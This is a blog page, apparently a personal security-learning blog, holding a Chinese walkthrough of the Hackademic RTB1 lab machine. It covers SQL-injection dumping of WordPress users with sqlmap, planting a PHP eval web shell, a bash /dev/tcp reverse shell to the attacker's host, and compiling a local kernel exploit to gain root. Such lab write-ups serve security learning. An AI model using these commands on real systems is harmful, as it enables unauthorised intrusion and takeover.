@@ -1,0 +1,585 @@
+
+    <!DOCTYPE html>
+    <html lang="en"
+            
+          
+    >
+    <head>
+    <meta charset="utf-8">
+    
+
+    
+
+    
+    <title>
+        Hackademic靶机 |
+        
+        Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CUbuntu%20Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+    
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/v4-font-face.min.css">
+
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="打靶准备1.安装靶机，记录靶机mac地址  2.通过arp-scan -l找到靶机ip地址  打靶流程端口扫描1.端口扫描，nmap 192.168.2.35,发现两个端口，22关闭，80打开  2.访问80端口  3.点击Hackademic.RTB1发现新目录  sql注入4.发现注入点  5.sqlmap注入，爆数据库sqlmap -u “http:&#x2F;&#x2F;192.168.2.35&#x2F;Hackad">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackademic靶机">
+<meta property="og:url" content="http://example.com/2024/01/14/Hackademic%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="打靶准备1.安装靶机，记录靶机mac地址  2.通过arp-scan -l找到靶机ip地址  打靶流程端口扫描1.端口扫描，nmap 192.168.2.35,发现两个端口，22关闭，80打开  2.访问80端口  3.点击Hackademic.RTB1发现新目录  sql注入4.发现注入点  5.sqlmap注入，爆数据库sqlmap -u “http:&#x2F;&#x2F;192.168.2.35&#x2F;Hackad">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705194999753-dfee15ba-5451-43a2-a033-ea6af4fd7743.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195187194-da7480d3-6390-4927-bf71-24bb56390c3e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195287272-f85b191d-042d-4456-abc4-656ce028a945.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195396913-e9f97b77-e4b2-4134-8462-a4aa564c0dcf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/40675992/1705195453954-a8419b1f-c1de-414f-a074-5184bb400894.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195885339-20fe30ac-443f-4b2a-9b88-884dc3d021a3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196142024-9d1e24f6-c032-4629-8615-93f0d6c62fca.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196424688-dbb6f619-a47d-41df-9713-4c40799ce9d5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196495383-c6cc9e5b-95be-43a8-803b-d51bf626080e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196526062-698527f6-452b-4cb8-83ba-203066c2db92.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195733692-64a12b49-4090-4bc1-bfc2-bda5d040798d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195754215-f09ce4b3-01de-4dc4-9883-1ac47d36f138.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196639965-095c5739-32f4-4cd7-8be1-12f9f8321a2f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196664430-16223ac7-8ee1-4505-b799-9058d3575a15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196704934-544c523e-7ece-407c-8efd-7765a78cd129.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196756702-9b32a122-4e4c-4b43-ae8a-509159cd0b56.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196785942-1b63f7ba-e953-400b-a261-cd82004b3c4a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196850341-c07c3473-9323-454f-b0b5-d32039c61465.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196866125-07e060ff-c9ff-48fb-9c95-5f3ef74d47ef.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196884316-278ca358-c445-455b-a2f5-5ca5ed0b8238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196906029-20fbcf6f-b29d-4c2a-a681-b6cb5ee99e2c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196935292-36bd0d5a-812f-4170-817f-9850e2402067.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196967533-14da5c56-ea65-44d0-a500-d28934208646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196983348-2ff33d77-01c6-42dd-bc44-69a6bed19919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197001879-c2add98d-0368-4623-8e8a-01844ecc619c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705141919393-f8570341-ac54-4362-83a4-d850e33a7cc5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197036878-33f9b8a9-d724-45ca-9e8b-b164963415f7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197053095-8eb9005c-cef8-488d-8588-b68ab551f099.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197067323-e6d8d4f3-6c3f-4696-81ab-e0f8649a198e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197145512-e391b521-35db-41cb-a198-69782d717be6.png">
+<meta property="article:published_time" content="2024-01-14T01:53:57.000Z">
+<meta property="article:modified_time" content="2024-01-14T02:03:52.438Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705194999753-dfee15ba-5451-43a2-a033-ea6af4fd7743.png">
+    
+        <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+    
+    
+    
+    
+    
+<script src="https://unpkg.com/pace-js@1.2.4/pace.min.js"></script>
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/wowjs@1.1.3/css/libs/animate.css">
+
+        
+<script src="https://unpkg.com/wowjs@1.1.3/dist/wow.min.js"></script>
+
+        <script>
+          new WOW({
+            offset: 0,
+            mobile: true,
+            live: false
+          }).init();
+        </script>
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+    <body>
+    
+<div id='loader'>
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="loading-taichi">
+      <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+      <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+      <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+      <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+    </svg>
+    </div>
+    <div class="loading-word">少女祈祷中...</div>
+  </div>
+</div>
+</div>
+
+<script>
+  const endLoading = function() {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('load', endLoading);
+  document.getElementById('loader').addEventListener('click', endLoading);
+</script>
+
+
+    <div id="container">
+        <div id="wrap">
+            <header id="header">
+    
+        <img data-src="/images/banner.jpg" data-sizes="auto" alt="Hackademic靶机" class="lazyload">
+    
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <div id="logo-wrap">
+                
+                    
+                    
+                        <a href="/" id="logo"><h1>Hackademic靶机</h1></a>
+                    
+                
+            </div>
+            
+                
+                
+            
+        </div>
+        <div id="header-inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/">Home</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/archives">Archives</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/about">About</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/friend">Friend</a>
+                    </span>
+                
+            </nav>
+            <nav id="sub-nav">
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml"
+                       title="RSS Feed"></a>
+                
+                
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+            </div>
+        </div>
+    </div>
+</header>
+
+            <div id="content" class="outer">
+                <section id="main"><article id="post-Hackademic靶机" class="h-entry article article-type-post"
+         itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <div class="article-inner">
+        <div class="article-meta">
+            <div class="article-date wow slideInLeft">
+    <a href="/2024/01/14/Hackademic%E9%9D%B6%E6%9C%BA/" class="article-date-link">
+        <time datetime="2024-01-14T01:53:57.000Z"
+              itemprop="datePublished">2024-01-14</time>
+    </a>
+</div>
+
+            
+
+        </div>
+        <div class="hr-line"></div>
+        
+
+        <div class="e-content article-entry" itemprop="articleBody">
+            
+                <h2 id="打靶准备"><a href="#打靶准备" class="headerlink" title="打靶准备"></a>打靶准备</h2><p>1.安装靶机，记录靶机mac地址</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705194999753-dfee15ba-5451-43a2-a033-ea6af4fd7743.png" alt="img"></p>
+<p>2.通过arp-scan -l找到靶机ip地址</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195187194-da7480d3-6390-4927-bf71-24bb56390c3e.png" alt="img"></p>
+<h2 id="打靶流程"><a href="#打靶流程" class="headerlink" title="打靶流程"></a>打靶流程</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>1.端口扫描，nmap 192.168.2.35,发现两个端口，22关闭，80打开</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195287272-f85b191d-042d-4456-abc4-656ce028a945.png" alt="img"></p>
+<p>2.访问80端口</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195396913-e9f97b77-e4b2-4134-8462-a4aa564c0dcf.png" alt="img"></p>
+<p>3.点击Hackademic.RTB1发现新目录</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/40675992/1705195453954-a8419b1f-c1de-414f-a074-5184bb400894.png" alt="img"></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>4.发现注入点</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195885339-20fe30ac-443f-4b2a-9b88-884dc3d021a3.png" alt="img"></p>
+<p>5.sqlmap注入，爆数据库sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.35/Hackademic_RTB1/?cat=1">http://192.168.2.35/Hackademic_RTB1/?cat=1</a>“ –batch –dbs </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196142024-9d1e24f6-c032-4629-8615-93f0d6c62fca.png" alt="img"></p>
+<p> mysql和information_schema是mysql5.0之后存在的库，所以可以直接对wordpress进行操作。<br>爆表：<br><strong>python sqlmap.py -u “</strong><a target="_blank" rel="noopener" href="http://192.168.13.135/Hackademic_RTB1/?cat=1%22">http://192.168.2.35/Hackademic_RTB1&#x2F;?cat&#x3D;1”</a>-D wordpress –tables</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196424688-dbb6f619-a47d-41df-9713-4c40799ce9d5.png" alt="img"></p>
+<p> 爆值：<br><strong>python sqlmap.py -u “</strong><a target="_blank" rel="noopener" href="http://192.168.13.135/Hackademic_RTB1/?cat=1%22">http://192.168.2.35/Hackademic_RTB1&#x2F;?cat&#x3D;1”</a>** -D wordpress -T wp_users –dump**  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196495383-c6cc9e5b-95be-43a8-803b-d51bf626080e.png" alt="img"></p>
+<p> 也可以通过-C选择部分的列进行展示:<strong>python sqlmap.py -u “</strong><a target="_blank" rel="noopener" href="http://192.168.13.135/Hackademic_RTB1/?cat=1%22">http://192.168.13.135/Hackademic_RTB1&#x2F;?cat&#x3D;1”</a>** -D wordpress -T wp_users -C “ID,user_pass,user_email,user_level,user_lastname,user_nicename,user_firstname” –dump**  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196526062-698527f6-452b-4cb8-83ba-203066c2db92.png" alt="img"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>6.扫目录，dirsearch -u “192.168.2.35” -x 404,403 ，dirsearch -u “192.168.2.35&#x2F;Hackademic_RTB1” -x 404,403 ，两个目录都扫一下</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195733692-64a12b49-4090-4bc1-bfc2-bda5d040798d.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705195754215-f09ce4b3-01de-4dc4-9883-1ac47d36f138.png" alt="img"></p>
+<p>7.发现一个登陆页面，用sqlmap扫出来的账户密码尝试登陆， 最后发现GeorgeMiller这个账户能够登陆成功。  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196639965-095c5739-32f4-4cd7-8be1-12f9f8321a2f.png" alt="img"></p>
+<p>\8. 一个个进行点击尝试发现在manage下面存在可编辑文件file  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196664430-16223ac7-8ee1-4505-b799-9058d3575a15.png" alt="img"></p>
+<p>\9. 用**phpinfo();**判断是否能够直接上马  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196704934-544c523e-7ece-407c-8efd-7765a78cd129.png" alt="img"></p>
+<p> 判断成功可以上马，之后用蚁剑的木马进行尝试：<br><strong>@eval($_POST[a]);</strong></p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196756702-9b32a122-4e4c-4b43-ae8a-509159cd0b56.png" alt="img"></p>
+<p> 用蚁剑登录之后查看权限：<br><strong>whoami</strong>#apache是个服务权限，权限较低<br><strong>id</strong></p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196785942-1b63f7ba-e953-400b-a261-cd82004b3c4a.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>nc -nvlp 4444</strong>:这一步是在kali虚拟机中，因为要实现的是一个反弹shell，将蚁剑上的命令行窗口转移到kuli虚拟机上。<br>nc -nvlp 4444#用于在端口 4444 上启动一个监听器，以侦听来自网络上某个客户端的连接。nc是一个工具，只要是tcp的端口都能进行连接。-nvlp来监听本地。<br>这一步是在蚁剑得命令行中进行的操作：<br><strong>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.13.130&#x2F;4444 0&gt;&amp;1</strong><br>#这个命令是一个 Bash 一句话反弹 shell 的 Payload，它会尝试与指定的 IP 地址和端口建立反向 shell 连接。<br>具体来说，这个命令中的 bash -i 表示以交互模式运行 Bash shell，&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.13.130&#x2F;4444 表示将标准输出和标准错误重定向到指定的 IP 地址和端口上，并且 0&gt;&amp;1 表示将标准输入指向标准输出，以便确保交互性输入。  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196850341-c07c3473-9323-454f-b0b5-d32039c61465.png" alt="img"></p>
+<p> 之后又会重新弹出一个新的bash。是与之前的bash是相互隔离的。<br>输入dir能够正常显示目录就是成功了。  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196866125-07e060ff-c9ff-48fb-9c95-5f3ef74d47ef.png" alt="img"></p>
+<p><strong>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong></p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196884316-278ca358-c445-455b-a2f5-5ca5ed0b8238.png" alt="img"></p>
+<p>这行命令获得一个稍微强点的会话。通过这个命令直接使之前的半交互式换成了全交互式的bash。这条命令将启动一个交互式的 Bash shell，然后通过 Python 的 -c 参数直接执行了一行 Python 代码。在这行代码中，import pty 用于导入 Python 的 pty 模块，pty.spawn(“&#x2F;bin&#x2F;bash”) 用于利用伪终端（pty）来启动一个交互式的 Bash shell。</p>
+<p>当在命令行中执行这条命令时，它会创建一个新的交互式的 Bash shell，能够以交互式的方式与系统进行通信，就好像使用了真正的终端一样。<br>这种方法通常用于绕过一些限制性的 shell，比如在一个受限的 shell 中时，可以通过这种方式获取一个更加灵活的交互式 shell。<br><strong>uname -a</strong>#查看内核版本，这个同样是在反弹的shell中进行输入</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196906029-20fbcf6f-b29d-4c2a-a681-b6cb5ee99e2c.png" alt="img"></p>
+<p><strong>searchsploit 2.6.3|grep local</strong>#退出反弹shell之后进行输入  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196935292-36bd0d5a-812f-4170-817f-9850e2402067.png" alt="img"></p>
+<p> locate 15285.c#全局检索<br>也可以通过<strong>find &#x2F; -name grep|local linux</strong>进行查找路径  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196967533-14da5c56-ea65-44d0-a500-d28934208646.png" alt="img"></p>
+<p>复制到当前目录下<br><strong>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;15285.c .</strong><br>ls进行查看  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705196983348-2ff33d77-01c6-42dd-bc44-69a6bed19919.png" alt="img"></p>
+<p> 然后将15285.c复制到蚁剑目录下的tmp目录下面  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197001879-c2add98d-0368-4623-8e8a-01844ecc619c.png" alt="img"></p>
+<p><strong>cd &#x2F;tmp</strong>#切换到根目录下的tmp目录<br><strong>ls</strong><br>[<img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705141919393-f8570341-ac54-4362-83a4-d850e33a7cc5.png" alt="img">tent.com&#x2F;tfktk&#x2F;picture&#x2F;main&#x2F;img&#x2F;1705141919393-f8570341-ac54-4362-83a4-d850e33a7cc5.png)</p>
+<p><strong>gcc 15285.c -o exp</strong>#gcc 是 C 语言的编译器，用于将 C 语言源代码转换成可执行文件。编译一个名为 “15285.c” 的 C 语言源文件，并将生成的可执行文件命名为 “exp”，-o 参数用于指定输出文件的名称。</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197036878-33f9b8a9-d724-45ca-9e8b-b164963415f7.png" alt="img"></p>
+<p><strong>chmod +x .&#x2F;exp</strong>#赋予执行权限给当前目录下的exp文件  </p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197053095-8eb9005c-cef8-488d-8588-b68ab551f099.png" alt="img"><br><strong>.&#x2F;exp#执行exp文件</strong><br><strong>whoami#查看当前身份</strong><br><strong>id#查看当前用户id</strong></p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197067323-e6d8d4f3-6c3f-4696-81ab-e0f8649a198e.png" alt="img"></p>
+<p>当前身份变为root，提权成功</p>
+<h3 id="拿到key"><a href="#拿到key" class="headerlink" title="拿到key"></a>拿到key</h3><p><strong>cd &#x2F;root#切换到root用户</strong><br><strong>ls#查看文件</strong><br><strong>cat key.txt#查看key.txt</strong><br><strong>cat key.txt~</strong></p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1705197145512-e391b521-35db-41cb-a198-69782d717be6.png" alt="img"></p>
+
+            
+        </div>
+        <footer class="article-footer">
+            <a data-url="http://example.com/2024/01/14/Hackademic%E9%9D%B6%E6%9C%BA/" data-id="clrcus3m70000ncvl1odqfjq6" data-title="Hackademic靶机"
+               class="article-share-link">Share</a>
+            
+            
+            
+            
+
+        </footer>
+    </div>
+    
+        
+    <nav id="article-nav" class="wow fadeInUp">
+        
+        
+            <div class="article-nav-link-wrap article-nav-link-right">
+                
+                    
+                    
+                        <img data-src="/images/banner.jpg" data-sizes="auto" alt="monney box靶机"
+                             class="lazyload">
+                    
+                
+                <a href="/2024/01/08/box%E9%9D%B6%E6%9C%BA/"></a>
+                <div class="article-nav-caption">Older</div>
+                <h3 class="article-nav-title">
+                    
+                        monney box靶机
+                    
+                </h3>
+            </div>
+        
+    </nav>
+
+
+    
+</article>
+
+
+
+
+
+
+
+
+
+
+
+</section>
+                
+                    <aside id="sidebar">
+    <div class="sidebar-wrap wow fadeInRight">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+            <div class="sidebar-author-name">John Doe</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">24</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">About</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Friend</div>
+                </div>
+            
+        </div>
+    </div>
+    
+        
+
+    
+        
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+        </div>
+    </div>
+
+
+    
+</aside>
+
+                
+            </div>
+            <footer id="footer" class="wow fadeInUp">
+    <div style="width: 100%; overflow: hidden"><div class="footer-line"></div></div>
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            
+            <div>
+                <span class="icon-copyright"></span>
+                2020-2024
+                <span class="footer-info-sep"></span>
+                John Doe
+            </div>
+            
+                <div>
+                    Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+                    Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+                </div>
+            
+            
+                <div>
+                    <span class="icon-brush"></span>
+                    25.5k
+                    &nbsp;|&nbsp;
+                    <span class="icon-coffee"></span>
+                    01:40
+                </div>
+            
+            
+                <div>
+                    <span class="icon-eye"></span>
+                    <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                    &nbsp;|&nbsp;
+                    <span class="icon-user"></span>
+                    <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+                </div>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+        <nav id="mobile-nav">
+    <div class="sidebar-wrap">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+            <div class="sidebar-author-name">John Doe</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">24</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">About</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Friend</div>
+                </div>
+            
+        </div>
+    </div>
+</nav>
+
+        
+<script src="https://unpkg.com/jquery@3.7.0/dist/jquery.min.js"></script>
+
+
+<script src="https://unpkg.com/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://unpkg.com/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script>
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+    <div class="site-search">
+        <div class="algolia-popup popup">
+            <div class="algolia-search">
+                <span class="algolia-search-input-icon"></span>
+                <div class="algolia-search-input" id="algolia-search-input"></div>
+            </div>
+
+            <div class="algolia-results">
+                <div id="algolia-stats"></div>
+                <div id="algolia-hits"></div>
+                <div id="algolia-pagination" class="algolia-pagination"></div>
+            </div>
+
+            <span class="popup-btn-close"></span>
+        </div>
+    </div>
+    </body>
+    </html>
+
